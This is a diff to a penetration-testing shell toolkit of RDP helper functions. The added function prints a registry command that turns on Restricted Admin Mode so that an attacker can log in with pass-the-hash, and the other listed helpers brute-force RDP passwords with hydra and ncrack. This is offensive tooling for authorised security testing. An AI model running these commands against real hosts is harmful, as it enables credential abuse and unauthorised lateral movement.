@@ -14,6 +14,7 @@ Commands
 --------
 nb-enum-rdp-install                  installs dependencies
 nb-enum-rdp-hydra                    brute force with hydra
+nb-enum-rdp-enable-pth               command to use to enable pth login via rdp
 nb-enum-rdp-nmap-sweep               scan a network for services
 nb-enum-rdp-tcpdump                  capture traffic to and from a host
 nb-enum-rdp-ncrack                   brute force passwords for a user account
@@ -27,6 +28,12 @@ DOC
 nb-enum-rdp-install() {
     __info "Running $0..."
     __pkgs nmap tcpdump ncrack metasploit-framework
+}
+
+nb-enum-rdp-enable-pth() {
+    __info 'To be able to RDP via PtH, we need to enable Restricted Admin Mode - use this command to enable Restricted Admin Mode:'
+    __info 'After enabling this you can log in via pth - nb-ad-rce-rdp'
+    __ok 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f'
 }
 
 nb-enum-rdp-hydra() {
